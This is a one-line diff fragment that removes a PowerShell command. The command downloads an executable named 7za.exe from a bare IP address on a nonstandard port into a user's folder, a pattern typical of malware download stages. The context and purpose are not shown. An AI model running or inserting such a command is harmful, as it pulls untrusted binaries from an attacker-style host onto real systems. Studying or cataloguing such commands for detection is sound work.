@@ -1,1 +1,0 @@
-"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://150.129.234.203:82/7za.exe', 'C:\Users\puncher\7za.exe')"
